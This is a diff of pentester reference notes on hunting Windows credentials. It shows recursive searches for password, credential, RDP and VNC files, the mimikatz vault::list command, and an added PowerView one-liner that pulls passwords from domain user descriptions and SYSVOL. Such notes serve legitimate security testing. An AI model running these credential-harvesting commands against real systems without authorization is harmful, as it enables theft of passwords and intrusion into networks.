@@ -344,7 +344,7 @@ CMD> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.co
 PS> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
 ```
 
-Refer to [these notes](/operating-systems/windows/security/index.md#windows-pentester-notes-):
+Refer to [these notes for SAM, LSA, Credential Manager](/operating-systems/windows/security/index.md#windows-pentester-notes-):
 
 ```shell!
 mimikatz# vault::list
@@ -360,7 +360,11 @@ Dig centrally deployed application:
 
 📚 See also: [PowerShell Secure String](/operating-systems/windows/security/index.md#powershell-securestring) for encrypted passwords.
 
-📚 Remember to look inside network shares too.
+📚 Remember to look inside network shares too including SYSVOL. Password may be stored in the user description too.
+
+```ps
+PS> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null} # PowerView
+```
 </div></div>
 
 <hr class="sep-both">
